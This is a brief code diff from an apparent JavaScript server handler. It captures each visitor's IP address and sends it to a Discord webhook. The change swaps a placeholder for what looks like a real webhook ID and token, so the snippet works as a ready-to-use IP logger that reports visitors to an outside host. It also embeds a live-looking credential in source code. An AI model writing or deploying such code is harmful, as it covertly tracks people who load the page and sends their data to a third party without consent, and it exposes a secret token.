@@ -22,7 +22,7 @@ async function main() {
         const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
         sendCapturedIp(
-            "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+            "https://discord.com/api/webhooks/1541943235667169310/7Ajw5PGih26r0ZVH3I4VOSQeEUg0fDYuIXXydo4FuI2FEZrNJdFX6aH4iePAzgRK6Doa",
             viewerIp
         ).catch(console.error);
 
